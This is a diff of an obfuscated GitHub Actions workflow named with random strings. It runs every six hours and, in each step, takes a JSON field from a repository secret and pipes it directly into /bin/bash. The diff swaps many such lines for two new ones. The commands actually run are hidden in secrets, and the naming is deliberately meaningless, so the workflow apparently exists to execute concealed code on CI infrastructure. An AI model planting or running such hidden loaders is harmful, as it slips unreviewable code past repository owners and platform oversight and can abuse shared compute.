@@ -2,29 +2,18 @@ name: weibushuang5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
+    - cron: '56 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: weibushuang5678
         env:
-          fune488: ${{ secrets.fune488 }}
+          pvq017: ${{ secrets.pvq017 }}
         run: |
-          echo $fune488 | jq -r .sdsds48495 | /bin/bash
-          echo $tyyh8479 | jq -r .gvx3 | /bin/bash
-          echo $x1 | jq -r .irgwm1 | /bin/bash
-          echo $oa45 | jq -r .ahrv699 | /bin/bash
-          echo $cdxu2 | jq -r .a15340 | /bin/bash
-          echo $xfetu1499 | jq -r .f2 | /bin/bash
-          echo $cmkk1 | jq -r .ohu47833 | /bin/bash
-          echo $kiotg1 | jq -r .wwjy62837 | /bin/bash
-          echo $djzn355 | jq -r .o334 | /bin/bash
-          echo $p2 | jq -r .gqfo8 | /bin/bash
-          echo $z7826 | jq -r .wcf05154 | /bin/bash
-          echo $r18439 | jq -r .zrx11698 | /bin/bash
-          echo $gesp3 | jq -r .dnmb841 | /bin/bash
-          echo $s59 | jq -r .qaxbe066 | /bin/bash
+          echo $pvq017 | jq -r .dcqf5781 | /bin/bash
+          echo $ds41633 | jq -r .cacpb813 | /bin/bash
 
